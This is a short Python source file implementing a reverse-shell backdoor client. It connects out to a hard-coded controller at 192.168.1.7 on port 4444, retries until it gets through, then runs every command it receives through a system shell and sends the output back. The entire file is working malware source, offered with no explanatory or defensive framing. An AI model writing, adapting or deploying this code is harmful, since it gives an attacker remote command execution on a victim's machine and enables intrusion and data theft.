import socket
import json
import subprocess
import os
import time

SERVER_IP = "192.168.1.7"
SERVER_PORT = 4444


def send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())


def recv():
    data = ""
    while True:
        try:
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    while True:
        try:
            target_sock.connect((SERVER_IP, SERVER_PORT))
            shell()
            target_sock.close()
            break
        except:
            connection()


def shell():
    while True:
        command = str(recv())
        if command.lower().strip() == "quit" or command.lower().strip() == "exit":
            break
        elif command.lower().strip() == "cls" or command.lower().strip() == "clear":
            pass
        elif command.lower().strip()[:2] == "cd" and command[2:].strip() in ["/", "\\", "..", "."]:
            os.chdir(command[2:].strip())
        elif command.lower().strip()[:3] == "cd ":
            os.chdir(command[3:])
        else:
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            if result == "":
                result = " "
            send(result)


target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
time.sleep(3.5)
connection()
